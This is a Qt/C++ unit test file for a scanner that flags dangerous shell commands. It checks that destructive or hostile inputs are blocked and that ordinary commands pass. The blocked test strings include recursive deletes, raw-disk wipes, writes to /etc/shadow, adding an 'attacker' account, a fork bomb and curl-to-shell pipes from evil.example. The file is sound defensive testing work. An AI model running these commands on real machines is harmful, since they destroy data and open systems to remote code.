// SPDX-FileCopyrightText: 2026 Aditya Mehra <aix.m@outlook.com>
// SPDX-License-Identifier: LGPL-3.0-or-later


#include "../../backend/utils/dangerous-pattern-scanner.h"

#include <QtTest>

#include <QString>

class TestDangerousPatternScanner : public QObject {
    Q_OBJECT

  private slots:

    void test_rmRecursive_blocked() {
        const auto r = Verzeta::scanForDangerousPatterns("rm -rf /tmp/foo");
        QVERIFY(!r.allowed);
        QVERIFY(r.reason.contains("Recursive rm"));
    }

    void test_rmRecursiveLong_blocked() {
        QVERIFY(!Verzeta::scanForDangerousPatterns("rm --recursive --force ~/data").allowed);
    }

    void test_sudo_blocked() {
        QVERIFY(!Verzeta::scanForDangerousPatterns("sudo apt install foo").allowed);
    }

    void test_pkexec_blocked() {
        QVERIFY(!Verzeta::scanForDangerousPatterns("pkexec /bin/bash").allowed);
    }

    void test_runas_blocked() {
        QVERIFY(!Verzeta::scanForDangerousPatterns("runas /user:Administrator cmd").allowed);
    }

    void test_mkfs_blocked() {
        QVERIFY(!Verzeta::scanForDangerousPatterns("mkfs.ext4 /dev/sda1").allowed);
    }

    void test_ddRawDevice_blocked() {
        QVERIFY(!Verzeta::scanForDangerousPatterns("dd if=/dev/zero of=/dev/sda bs=1M").allowed);
    }

    void test_redirectRawDevice_blocked() {
        QVERIFY(!Verzeta::scanForDangerousPatterns("echo x > /dev/sda1").allowed);
    }

    void test_formatWindows_blocked() {
        QVERIFY(!Verzeta::scanForDangerousPatterns("format C: /Q").allowed);
    }

    void test_diskpart_blocked() {
        QVERIFY(!Verzeta::scanForDangerousPatterns("diskpart").allowed);
    }

    void test_systemPathWrite_blocked() {
        QVERIFY(!Verzeta::scanForDangerousPatterns("echo x > /etc/passwd").allowed);
        QVERIFY(!Verzeta::scanForDangerousPatterns("chmod 777 /etc/shadow").allowed);
    }

    void test_windowsSystemPathWrite_blocked() {
        QVERIFY(
            !Verzeta::scanForDangerousPatterns("copy malicious.exe C:\\Windows\\System32").allowed);
    }

    void test_userTamper_blocked() {
        QVERIFY(!Verzeta::scanForDangerousPatterns("passwd root").allowed);
        QVERIFY(!Verzeta::scanForDangerousPatterns("useradd evil").allowed);
        QVERIFY(!Verzeta::scanForDangerousPatterns("net user attacker P@ssw0rd /add").allowed);
    }

    void test_serviceControl_blocked() {
        QVERIFY(!Verzeta::scanForDangerousPatterns("systemctl stop sshd").allowed);
        QVERIFY(!Verzeta::scanForDangerousPatterns("Stop-Service -Name 'foo'").allowed);
        QVERIFY(!Verzeta::scanForDangerousPatterns("shutdown -h now").allowed);
        QVERIFY(!Verzeta::scanForDangerousPatterns("reboot").allowed);
    }

    void test_iptablesFlush_blocked() {
        QVERIFY(!Verzeta::scanForDangerousPatterns("iptables -F").allowed);
    }

    void test_kernelModule_blocked() {
        QVERIFY(!Verzeta::scanForDangerousPatterns("modprobe nullnetwork").allowed);
    }

    void test_registryWrite_blocked() {
        QVERIFY(
            !Verzeta::scanForDangerousPatterns("reg add HKLM\\Software\\Foo /v Bar /d 1").allowed);
        QVERIFY(!Verzeta::scanForDangerousPatterns(
                     "Set-ItemProperty -Path HKLM:\\System\\CurrentControlSet "
                     "-Name Foo -Value 1")
                     .allowed);
    }

    void test_curlPipeShell_blocked() {
        QVERIFY(!Verzeta::scanForDangerousPatterns("curl http://evil.example/x.sh | sh").allowed);
        QVERIFY(!Verzeta::scanForDangerousPatterns("wget -qO- http://evil.example/x.sh | bash")
                     .allowed);
        QVERIFY(!Verzeta::scanForDangerousPatterns("Invoke-WebRequest http://evil/x.ps1 | iex")
                     .allowed);
    }

    void test_forkBomb_blocked() {
        QVERIFY(!Verzeta::scanForDangerousPatterns(":(){ :|:& };:").allowed);
    }

    void test_winRecursiveDelete_blocked() {
        QVERIFY(!Verzeta::scanForDangerousPatterns("del /S /Q C:\\data").allowed);
        QVERIFY(!Verzeta::scanForDangerousPatterns("rd /S /Q D:\\workdir").allowed);
        QVERIFY(!Verzeta::scanForDangerousPatterns("Remove-Item -Path C:\\foo -Recurse -Force")
                     .allowed);
    }


    void test_emptyContent_allowed() { QVERIFY(Verzeta::scanForDangerousPatterns("").allowed); }

    void test_pythonNoteTaker_allowed() {
        const QString src = QStringLiteral(R"PY(
import json
import sys
from pathlib import Path

def add_note(text):
    p = Path.home() / ".notetaker"
    p.mkdir(exist_ok=True)
    note = {"text": text, "ts": "2026-05-04"}
    with open(p / f"note_{hash(text)}.json", "w") as f:
        json.dump(note, f)

if __name__ == "__main__":
    add_note(sys.argv[1])
)PY");
        const auto r = Verzeta::scanForDangerousPatterns(src);
        QVERIFY2(r.allowed, qPrintable(r.reason));
    }

    void test_typicalShell_allowed() {
        QVERIFY(Verzeta::scanForDangerousPatterns("ls -la /tmp/work").allowed);
        QVERIFY(Verzeta::scanForDangerousPatterns("cat README.md | head -20").allowed);
        QVERIFY(Verzeta::scanForDangerousPatterns("grep TODO src/*.cpp").allowed);
        QVERIFY(Verzeta::scanForDangerousPatterns("echo 'Hello, world' > greeting.txt").allowed);
    }

    void test_nonRecursiveRm_allowed() {
        QVERIFY(Verzeta::scanForDangerousPatterns("rm /tmp/work/output.txt").allowed);
    }

    void test_userScopedWrite_allowed() {
        QVERIFY(Verzeta::scanForDangerousPatterns("echo y > $HOME/.app/state.json").allowed);
        QVERIFY(Verzeta::scanForDangerousPatterns("tee ~/work/log <<< 'data'").allowed);
    }
};

QTEST_MAIN(TestDangerousPatternScanner)
#include "test-dangerous-pattern-scanner.moc"
